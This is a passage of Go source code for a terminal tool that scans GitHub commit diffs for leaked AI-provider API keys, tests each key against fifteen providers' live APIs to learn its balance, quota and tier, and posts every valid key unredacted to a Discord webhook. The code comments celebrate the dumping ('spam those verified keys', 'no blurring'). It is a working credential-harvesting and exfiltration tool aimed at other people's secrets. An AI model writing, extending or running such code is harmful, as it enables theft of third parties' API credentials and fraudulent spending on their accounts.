        if n, err := strconv.Atoi(v); err == nil {
                return n
        }
        return fallback
}

// isHeadless returns true when running without a TTY
func isHeadless() bool {
        return os.Getenv("HEADLESS") == "true" || !isTerminal()
}

func isTerminal() bool {
        fi, err := os.Stdout.Stat()
        if err != nil {
                return false
        }
        return fi.Mode()&os.ModeCharDevice != 0
}

// ─── Redaction ───────────────────────────────────────────────────────────────

func redact(s string, show int) string {
        s = strings.TrimSpace(s)
        if len(s) <= show*2+4 {
                return strings.Repeat("*", len(s))
        }
        return s[:show] + strings.Repeat("*", len(s)-show*2) + s[len(s)-show:]
}

// ─── Key Extraction from Diff Line ──────────────────────────────────────────

func extractKey(text string, rule *Rule) string {
        loc := rule.Regex.FindStringIndex(text)
        if loc == nil {
                return ""
        }
        return rule.Regex.FindString(text[loc[0]:])
}

// VerifyResult holds verification output including balance/quota/tier info

type VerifyResult struct {
        Valid   bool
        Details string
        Balance string
        Quota   string
        Tier    string
        KeyType string
        Org     string
        Models  string
}

// ─── Verification Logic ─────────────────────────────────────────────────────

func verifyKey(provider string, key string, timeout time.Duration) VerifyResult {
        client := &http.Client{Timeout: timeout}

        switch provider {
        case "openai":
                return verifyOpenAI(client, key)
        case "anthropic":
                return verifyAnthropic(client, key)
        case "mistral":
                return verifyMistral(client, key)
        case "openrouter":
                return verifyOpenRouter(client, key)
        case "elevenlabs":
                return verifyElevenLabs(client, key)
        case "deepseek":
                return verifyDeepSeek(client, key)
        case "xai":
                return verifyXAI(client, key)
        case "huggingface":
                return verifyHuggingFace(client, key)
        case "groq":
                return verifyGroq(client, key)
        case "replicate":
                return verifyReplicate(client, key)
        case "perplexity":
                return verifyPerplexity(client, key)
        case "together":
                return verifyTogether(client, key)
        case "fireworks":
                return verifyFireworks(client, key)
        case "cohere":
                return verifyCohere(client, key)
        case "ai21":
                return verifyAI21(client, key)
        default:
                return VerifyResult{Valid: true, Details: "regex-only"}
        }
}

func failResult(detail string) VerifyResult {
        return VerifyResult{Valid: false, Details: detail}
}

func okResult(detail string) VerifyResult {
        return VerifyResult{Valid: true, Details: detail}
}

func verifyOpenAI(client *http.Client, key string) VerifyResult {
        // Step 1: Check if key is valid + get models
        req, _ := http.NewRequest("GET", "https://api.openai.com/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        bodyBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode == 403 {
                return okResult("valid / forbidden (org restricted)")
        }
        if resp.StatusCode != 200 && resp.StatusCode != 429 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid / has access"}

        // Detect key type
        if strings.HasPrefix(key, "sk-proj-") {
                result.KeyType = "Project"
        } else {
                result.KeyType = "Legacy"
        }

        if resp.StatusCode == 429 {
                result.Details = "valid / rate-limited"
        }

        // Step 2: Get org info + quota from /v1/me
        meReq, _ := http.NewRequest("GET", "https://api.openai.com/v1/me", nil)
        meReq.Header.Set("Authorization", "Bearer "+key)
        meResp, err := client.Do(meReq)
        if err == nil && meResp.StatusCode == 200 {
                var meData map[string]interface{}
                meBytes, _ := io.ReadAll(meResp.Body)
                meResp.Body.Close()
                json.Unmarshal(meBytes, &meData)
                if orgs, ok := meData["orgs"].(map[string]interface{}); ok {
                        if data, ok := orgs["data"].([]interface{}); ok && len(data) > 0 {
                                for _, o := range data {
                                        if org, ok := o.(map[string]interface{}); ok {
                                                if name, ok := org["name"].(string); ok {
                                                        result.Org = name
                                                        result.Details = "valid"
                                                }
                                        }
                                }
                        }
                }
        }

        // Step 3: Check quota by making a tiny completion request
        chatBody := `{"model":"gpt-4o-mini","messages":[{"role":"user","content":""}],"max_tokens":1}`
        chatReq, _ := http.NewRequest("POST", "https://api.openai.com/v1/chat/completions", bytes.NewBufferString(chatBody))
        chatReq.Header.Set("Authorization", "Bearer "+key)
        chatReq.Header.Set("Content-Type", "application/json")
        chatResp, err := client.Do(chatReq)
        if err == nil {
                chatBytes, _ := io.ReadAll(chatResp.Body)
                chatResp.Body.Close()

                // Get RPM from rate limit header
                if rpm := chatResp.Header.Get("X-Ratelimit-Limit-Requests"); rpm != "" {
                        result.Quota = rpm + " RPM"
                }

                // Get TPM for tier detection
                tpm := 0
                if tpmStr := chatResp.Header.Get("X-Ratelimit-Limit-Tokens"); tpmStr != "" {
                        fmt.Sscanf(tpmStr, "%d", &tpm)
                }
                result.Tier = openAITier(tpm)

                if chatResp.StatusCode == 429 || chatResp.StatusCode == 400 {
                        var errData map[string]interface{}
                        json.Unmarshal(chatBytes, &errData)
                        if errObj, ok := errData["error"].(map[string]interface{}); ok {
                                if errType, ok := errObj["type"].(string); ok {
                                        switch errType {
                                        case "insufficient_quota":
                                                result.Quota = "NO QUOTA"
                                        case "invalid_request_error":
                                                result.Quota = chatResp.Header.Get("X-Ratelimit-Limit-Requests") + " RPM (active)"
                                        case "billing_not_active":
                                                result.Quota = "BILLING NOT ACTIVE"
                                        }
                                }
                        }
                }
        }

        // Count accessible models from the first response
        if resp.StatusCode == 200 {
                var modelsData map[string]interface{}
                json.Unmarshal(bodyBytes, &modelsData)
                if data, ok := modelsData["data"].([]interface{}); ok {
                        result.Models = fmt.Sprintf("%d accessible", len(data))
                        result.Details = "valid"
                }
        }

        return result
}

func openAITier(tpm int) string {
        switch {
        case tpm >= 40000000:
                return "Tier 5"
        case tpm >= 4000000:
                return "Tier 4"
        case tpm >= 2000000:
                return "Tier 3"
        case tpm >= 1000000:
                return "Tier 2"
        case tpm >= 500000:
                return "Tier 1"
        default:
                return "Free"
        }
}

func verifyAnthropic(client *http.Client, key string) VerifyResult {
        body := `{"model":"claude-sonnet-4-20250514","messages":[{"role":"user","content":"hi"}],"max_tokens":1}`
        req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewBufferString(body))
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("anthropic-version", "2023-06-01")
        req.Header.Set("x-api-key", key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        result := VerifyResult{Valid: true}

        // Get tier from rate limit header
        if rl := resp.Header.Get("Anthropic-Ratelimit-Requests-Limit"); rl != "" {
                var rpm int
                fmt.Sscanf(rl, "%d", &rpm)
                result.Quota = fmt.Sprintf("%s RPM", rl)
                switch {
                case rpm >= 4000:
                        result.Tier = "Tier 4"
                case rpm >= 2000:
                        result.Tier = "Tier 3"
                case rpm >= 1000:
                        result.Tier = "Tier 2"
                case rpm >= 50:
                        result.Tier = "Tier 1"
                default:
                        result.Tier = "Free"
                }
        }

        if resp.StatusCode == 200 {
                result.Details = "valid"
                return result
        }
        if resp.StatusCode == 429 {
                result.Details = "valid / rate-limited"
                return result
        }
        if resp.StatusCode == 400 {
                result.Details = "valid / bad request (key works)"
                return result
        }
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }

        // Check for quota errors in response body
        var errData map[string]interface{}
        json.Unmarshal(respBytes, &errData)
        if errObj, ok := errData["error"].(map[string]interface{}); ok {
                if msg, ok := errObj["message"].(string); ok {
                        if strings.Contains(msg, "credit balance is too low") || strings.Contains(msg, "usage limits") {
                                result.Valid = true
                                result.Details = "valid / no quota"
                                result.Quota = "NO QUOTA"
                                return result
                        }
                        if strings.Contains(msg, "organization has been disabled") {
                                return failResult("org disabled")
                        }
                }
        }

        return failResult(fmt.Sprintf("status %d", resp.StatusCode))
}

func verifyMistral(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.mistral.ai/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        // Count models
        var modelsData map[string]interface{}
        json.Unmarshal(respBytes, &modelsData)
        if data, ok := modelsData["data"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(data))
        }

        // Check subscription by trying a chat request
        chatBody := `{"model":"open-mistral-7b","messages":[{"role":"user","content":""}],"max_tokens":-1}`
        chatReq, _ := http.NewRequest("POST", "https://api.mistral.ai/v1/chat/completions", bytes.NewBufferString(chatBody))
        chatReq.Header.Set("Authorization", "Bearer "+key)
        chatReq.Header.Set("Content-Type", "application/json")
        chatResp, err := client.Do(chatReq)
        if err == nil {
                chatResp.Body.Close()
                if chatResp.StatusCode == 422 {
                        result.Tier = "Active subscription"
                } else {
                        result.Tier = "Free / no sub"
                }
        }

        return result
}

func verifyOpenRouter(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://openrouter.ai/api/v1/auth/key", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        var authData map[string]interface{}
        json.Unmarshal(respBytes, &authData)
        if data, ok := authData["data"].(map[string]interface{}); ok {
                if usage, ok := data["usage"].(float64); ok {
                        result.Balance = fmt.Sprintf("$%.4f used", usage)
                }
                if limit, ok := data["limit"].(float64); ok {
                        if limit > 0 {
                                result.Balance += fmt.Sprintf(" / $%.2f limit", limit)
                                if usage, ok := data["usage"].(float64); ok {
                                        remaining := limit - usage
                                        if remaining > 0 {
                                                result.Balance += fmt.Sprintf(" ($%.4f remaining)", remaining)
                                        } else {
                                                result.Quota = "LIMIT REACHED"
                                        }
                                }
                        } else {
                                result.Balance += " / no limit"
                        }
                }
                if isFree, ok := data["is_free_tier"].(bool); ok && !isFree {
                        result.Tier = "Paid"
                } else {
                        result.Tier = "Free tier"
                }
                if rl, ok := data["rate_limit"].(map[string]interface{}); ok {
                        if reqs, ok := rl["requests"].(float64); ok {
                                result.Quota = fmt.Sprintf("%.0f RPM", reqs)
                        }
                }
        }

        return result
}

func verifyElevenLabs(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.elevenlabs.io/v1/user/subscription", nil)
        req.Header.Set("xi-api-key", key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        var subData map[string]interface{}
        json.Unmarshal(respBytes, &subData)

        if charLimit, ok := subData["character_limit"].(float64); ok {
                if charCount, ok := subData["character_count"].(float64); ok {
                        remaining := int(charLimit) - int(charCount)
                        result.Balance = fmt.Sprintf("%d / %d chars remaining", remaining, int(charLimit))
                }
        }
        if tier, ok := subData["tier"].(string); ok {
                result.Tier = tier
        }
        if canExtend, ok := subData["can_extend_character_limit"].(bool); ok {
                if canExtend {
                        if allowed, ok := subData["allowed_to_extend_character_limit"].(bool); ok && allowed {
                                result.Quota = "Unlimited (extendable)"
                        }
                }
        }

        return result
}

func verifyDeepSeek(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.deepseek.com/user/balance", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode == 429 {
                return failResult("rate-limited")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        var balData map[string]interface{}
        json.Unmarshal(respBytes, &balData)

        if isAvail, ok := balData["is_available"].(bool); ok {
                if !isAvail {
                        result.Quota = "Not available"
                }
        }

        if balanceInfos, ok := balData["balance_infos"].([]interface{}); ok {
                totalUSD := 0.0
                for _, bi := range balanceInfos {
                        if info, ok := bi.(map[string]interface{}); ok {
                                if bal, ok := info["total_balance"].(string); ok {
                                        var f float64
                                        _, _ = fmt.Sscanf(bal, "%f", &f)
                                        if currency, ok := info["currency"].(string); ok && currency == "CNY" {
                                                f *= 0.14
                                        }
                                        totalUSD += f
                                }
                        }
                }
                result.Balance = fmt.Sprintf("$%.2f USD", totalUSD)
        }

        return result
}

func verifyXAI(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.x.ai/v1/api-key", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        var keyData map[string]interface{}
        json.Unmarshal(respBytes, &keyData)

        if blocked, ok := keyData["team_blocked"].(bool); ok && blocked {
                result.Quota = "BLOCKED"
        }
        if blocked, ok := keyData["api_key_blocked"].(bool); ok && blocked {
                result.Quota = "BLOCKED"
        }
        if disabled, ok := keyData["api_key_disabled"].(bool); ok && disabled {
                result.Quota = "DISABLED"
        }

        // Test if sub is active
        chatBody := `{"messages":[],"model":"grok-3-mini-latest","frequency_penalty":-3.0}`
        chatReq, _ := http.NewRequest("POST", "https://api.x.ai/v1/chat/completions", bytes.NewBufferString(chatBody))
        chatReq.Header.Set("Authorization", "Bearer "+key)
        chatReq.Header.Set("Content-Type", "application/json")
        chatResp, err := client.Do(chatReq)
        if err == nil {
                chatResp.Body.Close()
                if chatResp.StatusCode == 200 || chatResp.StatusCode == 400 {
                        result.Tier = "Active"
                } else {
                        result.Tier = "Inactive"
                }
        }

        return result
}

func verifyHuggingFace(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://huggingface.co/api/whoami-v2", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if name, ok := data["name"].(string); ok {
                result.Details = "valid / user: " + name
        }
        if fullname, ok := data["fullname"].(string); ok {
                result.Tier = fullname
        }
        // Check if Pro
        if auth, ok := data["auth"].(map[string]interface{}); ok {
                if accessToken, ok := auth["accessToken"].(map[string]interface{}); ok {
                        if pro, ok := accessToken["isPro"].(bool); ok && pro {
                                result.Tier = "Pro"
                        }
                }
        }
        return result
}

func verifyGroq(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.groq.com/openai/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        modelCount := 0
        if models, ok := data["data"].([]interface{}); ok {
                modelCount = len(models)
                result.Models = fmt.Sprintf("%d models", modelCount)
                result.Details = fmt.Sprintf("valid / %d models", modelCount)
        }

        // Detect free trial vs paid via rate limit headers
        // Groq free tier: 30 RPM, 14400 RPD; paid/dev: much higher limits
        rlRequests := resp.Header.Get("X-Ratelimit-Limit-Requests")
        rlTokens := resp.Header.Get("X-Ratelimit-Limit-Tokens")
        rpdRequests := resp.Header.Get("X-Ratelimit-Limit-Requests-Per-Day")

        if rlRequests != "" {
                result.Quota = rlRequests + " RPM"
        }
        if rpdRequests != "" {
                if result.Quota != "" {
                        result.Quota += " / " + rpdRequests + " RPD"
                } else {
                        result.Quota = rpdRequests + " RPD"
                }
        }

        // Determine tier based on rate limits
        // Free trial: 30 RPM, 14400 RPD; Developer (paid): 30 RPM but higher token limits
        // Dev tier has X-Ratelimit-Limit-Tokens per day > 1M
        result.Tier = "Free Trial"
        if rlTokens != "" {
                if tokenLimit, err := strconv.ParseInt(rlTokens, 10, 64); err == nil && tokenLimit > 15000 {
                        result.Tier = "Developer (Paid)"
                }
        }
        // Also check per-day token limit
        rpdTokens := resp.Header.Get("X-Ratelimit-Limit-Tokens-Per-Day")
        if rpdTokens != "" {
                if tokenLimit, err := strconv.ParseInt(rpdTokens, 10, 64); err == nil && tokenLimit > 1000000 {
                        result.Tier = "Developer (Paid)"
                }
        }
        result.KeyType = result.Tier

        return result
}

func verifyReplicate(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.replicate.com/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }
        return VerifyResult{Valid: true, Details: "valid"}
}

func verifyPerplexity(client *http.Client, key string) VerifyResult {
        // Perplexity doesn't have a /models endpoint, try a tiny completion
        body := `{"model":"llama-3.1-sonar-small-128k-online","messages":[{"role":"user","content":"hi"}],"max_tokens":1}`
        req, _ := http.NewRequest("POST", "https://api.perplexity.ai/chat/completions", bytes.NewBufferString(body))
        req.Header.Set("Authorization", "Bearer "+key)
        req.Header.Set("Content-Type", "application/json")
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode == 200 {
                return okResult("valid")
        }
        if resp.StatusCode == 429 {
                return okResult("valid / rate-limited")
        }
        if resp.StatusCode == 400 {
                return okResult("valid / bad request (key works)")
        }
        return failResult(fmt.Sprintf("status %d", resp.StatusCode))
}

func verifyTogether(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.together.xyz/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if models, ok := data["data"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(models))
        }

        // Check billing/credits
        balReq, _ := http.NewRequest("GET", "https://api.together.xyz/api/account/balance", nil)
        balReq.Header.Set("Authorization", "Bearer "+key)
        balResp, err := client.Do(balReq)
        if err == nil && balResp.StatusCode == 200 {
                balBytes, _ := io.ReadAll(balResp.Body)
                balResp.Body.Close()
                var balData map[string]interface{}
                json.Unmarshal(balBytes, &balData)
                if walletInfo, ok := balData["wallet_info"].(map[string]interface{}); ok {
                        if credits, ok := walletInfo["credits"].(float64); ok {
                                result.Balance = fmt.Sprintf("$%.2f", credits)
                        }
                }
        }

        return result
}

func verifyFireworks(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.fireworks.ai/inference/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if models, ok := data["data"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(models))
        }
        return result
}

func verifyCohere(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.cohere.ai/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if models, ok := data["models"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(models))
        }

        // Check billing
        balReq, _ := http.NewRequest("GET", "https://api.cohere.ai/v1/billing/usage", nil)
        balReq.Header.Set("Authorization", "Bearer "+key)
        balResp, err := client.Do(balReq)
        if err == nil && balResp.StatusCode == 200 {
                balResp.Body.Close()
                result.Quota = "Active"
        }

        return result
}

func verifyAI21(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.ai21.com/studio/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }
        return VerifyResult{Valid: true, Details: "valid"}
}

// ─── Discord Webhook Sender (no delay — spam those verified keys) ───────────

type WebhookSender struct {
        url     string
        enabled bool
        program *tea.Program
        client  *http.Client
}

func NewWebhookSender(url string, p *tea.Program) *WebhookSender {
        return &WebhookSender{
                url:     url,
                enabled: url != "",
                program: p,
                client:  &http.Client{Timeout: 10 * time.Second},
        }
}

func providerEmoji(provider string) string {
        switch provider {
        case "openai":
                return "🤖"
        case "anthropic":
                return "🧠"
        case "mistral":
                return "🌀"
        case "openrouter":
                return "🛤️"
        case "elevenlabs":
                return "🔊"
        case "deepseek":
                return "🔮"
        case "xai":
                return "𝕏"
        case "huggingface":
                return "🤗"
        case "groq":
                return "⚡"
        case "replicate":
                return "🔁"
        case "perplexity":
                return "❓"
        case "together":
                return "🤝"
        case "fireworks":
                return "🎆"
        case "cohere":
                return "🔗"
        case "ai21":
                return "📐"
        default:
                return "🔑"
        }
}

func (w *WebhookSender) Send(match VerifiedMatch) {
        if !w.enabled {
                return
        }

        go func() {
                // Green for valid, red for invalid
                color := 0x04B575
                statusLabel := "✅ VALID"
                if match.Status != "verified" && match.Status != "regex-match (unverified)" {
                        color = 0xFF5555
                        statusLabel = "❌ INVALID"
                }

                // Full key, no blurring
                fullKey := match.Key
                if fullKey == "" {
                        fullKey = match.Redacted
                }

                emoji := providerEmoji(match.Provider)

                // Build the embed like a proper key checker bot
                fields := []DiscordEmbedField{
                        {Name: "Status", Value: statusLabel, Inline: true},
                        {Name: "Provider", Value: fmt.Sprintf("%s %s", emoji, strings.Title(match.Provider)), Inline: true},
                }

                // Key type (Project/Legacy/Live/Test/Bot)
                if match.KeyType != "" {
                        fields = append(fields, DiscordEmbedField{Name: "Type", Value: match.KeyType, Inline: true})
                }

                // Key in code block (full, not redacted)
                keyDisplay := fullKey
                if len(keyDisplay) > 1000 {
                        keyDisplay = keyDisplay[:1000] + "..."
                }
                fields = append(fields, DiscordEmbedField{Name: "Key", Value: fmt.Sprintf("```%s```", keyDisplay), Inline: false})

                // Org / Account
                if match.Org != "" {
                        fields = append(fields, DiscordEmbedField{Name: "🏢 Org", Value: match.Org, Inline: true})
                }

                // Models accessible
                if match.Models != "" {
                        fields = append(fields, DiscordEmbedField{Name: "🧮 Models", Value: match.Models, Inline: true})
                }

                // Balance
                if match.Balance != "" {
                        fields = append(fields, DiscordEmbedField{Name: "💰 Balance", Value: match.Balance, Inline: true})
                }

                // Quota / Rate Limit
                if match.Quota != "" {
                        fields = append(fields, DiscordEmbedField{Name: "⚡ Quota", Value: match.Quota, Inline: true})
                }

                // Tier / Plan
                if match.Tier != "" {
                        fields = append(fields, DiscordEmbedField{Name: "🏆 Tier", Value: match.Tier, Inline: true})
                }

                // Details (fallback for misc info)
                if match.Details != "" {
                        fields = append(fields, DiscordEmbedField{Name: "ℹ️ Details", Value: match.Details, Inline: false})
                }

                // Source
                fields = append(fields, DiscordEmbedField{Name: "📂 Repo", Value: match.Repo, Inline: true})
                fields = append(fields, DiscordEmbedField{Name: "🔗 Commit", Value: match.CommitUrl, Inline: false})

                embed := DiscordEmbed{
                        Title:       fmt.Sprintf("%s %s Key Check", emoji, strings.Title(match.Provider)),
                        Description: fmt.Sprintf("**%s** key detected and verified", strings.Title(match.Provider)),
                        Color:       color,
                        Fields:      fields,
                        Footer:      &DiscordEmbedFooter{Text: "Key Scanner | Auto-Verified"},
                }

                payload := DiscordPayload{Embeds: []DiscordEmbed{embed}}
                jsonData, err := json.Marshal(payload)
                if err != nil {
                        log.Printf("Webhook marshal error: %v", err)
                        w.program.Send(MsgWebhookResult{Success: false, Provider: match.Provider, Err: "marshal error"})
                        return
                }

                resp, err := w.client.Post(w.url, "application/json", bytes.NewBuffer(jsonData))
                if err != nil {
                        log.Printf("Webhook send error: %v", err)
                        w.program.Send(MsgWebhookResult{Success: false, Provider: match.Provider, Err: "request failed"})
                        return
                }
                resp.Body.Close()

                if resp.StatusCode == 429 {
                        // Discord rate limit — wait and retry once
                        log.Printf("Discord rate limited, waiting 2s...")
                        time.Sleep(2 * time.Second)
                        resp2, err2 := w.client.Post(w.url, "application/json", bytes.NewBuffer(jsonData))
                        if err2 == nil {
                                resp2.Body.Close()
                                w.program.Send(MsgWebhookResult{Success: true, Provider: match.Provider})
                        } else {
                                w.program.Send(MsgWebhookResult{Success: false, Provider: match.Provider, Err: "retry failed"})
                        }
                } else if resp.StatusCode >= 300 {
                        log.Printf("Webhook returned status %d", resp.StatusCode)
                        w.program.Send(MsgWebhookResult{Success: false, Provider: match.Provider, Err: fmt.Sprintf("HTTP %d", resp.StatusCode)})
                } else {
                        w.program.Send(MsgWebhookResult{Success: true, Provider: match.Provider})
                }
        }()
}

// ─── Verification Worker Pool ───────────────────────────────────────────────

func verifyWorker(id int, p *tea.Program, rawChan <-chan RawMatch, webhook *WebhookSender, cfg Config, wg *sync.WaitGroup) {
        defer wg.Done()
        timeout := time.Duration(cfg.VerifyTimeout) * time.Second

        for raw := range rawChan {
                if !raw.CanVerify || !cfg.EnableVerify {
                        // No verification possible / disabled — just report as regex-only match
                        verified := VerifiedMatch{
                                Provider:  raw.Provider,
                                Key:       raw.Text,
                                Redacted:  redact(raw.Text, 6),
                                Valid:     true, // unverified, assume potential match
                                Status:    "regex-match (unverified)",
                                Details:   "not verified",
                                Repo:      raw.Repo,
                                CommitUrl: raw.CommitUrl,
                        }
                        p.Send(MsgVerifiedMatch{
                                Provider:  verified.Provider,
                                Key:       verified.Key,
                                Redacted:  verified.Redacted,
                                Valid:     verified.Valid,
                                Status:    verified.Status,
                                Details:   verified.Details,
                                Balance:   verified.Balance,
                                Quota:     verified.Quota,
                                Tier:      verified.Tier,
                                KeyType:   verified.KeyType,
                                Org:       verified.Org,
                                Models:    verified.Models,
                                Repo:      verified.Repo,
                                CommitUrl: verified.CommitUrl,
                        })
                        continue
                }

                vr := verifyKey(raw.Provider, raw.Text, timeout)

                verified := VerifiedMatch{
                        Provider:  raw.Provider,
                        Key:       raw.Text,
                        Redacted:  redact(raw.Text, 6),
                        Valid:     vr.Valid,
                        Status:    "verified",
                        Details:   vr.Details,
                        Balance:   vr.Balance,
                        Quota:     vr.Quota,
                        Tier:      vr.Tier,
                        KeyType:   vr.KeyType,
                        Org:       vr.Org,
                        Models:    vr.Models,
                        Repo:      raw.Repo,
                        CommitUrl: raw.CommitUrl,
                }
                if !vr.Valid {
                        verified.Status = "invalid"
                }

                // Send to TUI (both valid and invalid)
                p.Send(MsgVerifiedMatch{
                        Provider:  verified.Provider,
                        Key:       verified.Key,
                        Redacted:  verified.Redacted,
                        Valid:     verified.Valid,
                        Status:    verified.Status,
                        Details:   verified.Details,
                        Balance:   verified.Balance,
                        Quota:     verified.Quota,
                        Tier:      verified.Tier,
                        KeyType:   verified.KeyType,
                        Org:       verified.Org,
                        Models:    verified.Models,
                        Repo:      verified.Repo,
                        CommitUrl: verified.CommitUrl,
                })

                // Send to Discord webhook — ONLY verified (valid) keys
                if vr.Valid && cfg.DiscordWebhook != "" {
                        webhook.Send(verified)
                }
        }
}

// ─── Scanner Worker ─────────────────────────────────────────────────────────

func scanWorker(id int, p *tea.Program, jobs <-chan ScanJob, rules []Rule, rawChan chan<- RawMatch, tokenPool *TokenPool) {
        client := &http.Client{Timeout: 30 * time.Second}
        for job := range jobs {
                p.Send(MsgScanStarted{CommitUrl: job.CommitUrl})
                req, err := http.NewRequest("GET", job.CommitUrl, nil)
                if err != nil {
                        p.Send(MsgScanCompleted{CommitUrl: job.CommitUrl})
                        continue
                }
                req.Header.Set("User-Agent", "scanner")
                req.Header.Set("Accept", "application/vnd.github.v3.diff")
                token := tokenPool.Next()
                if token != "" {
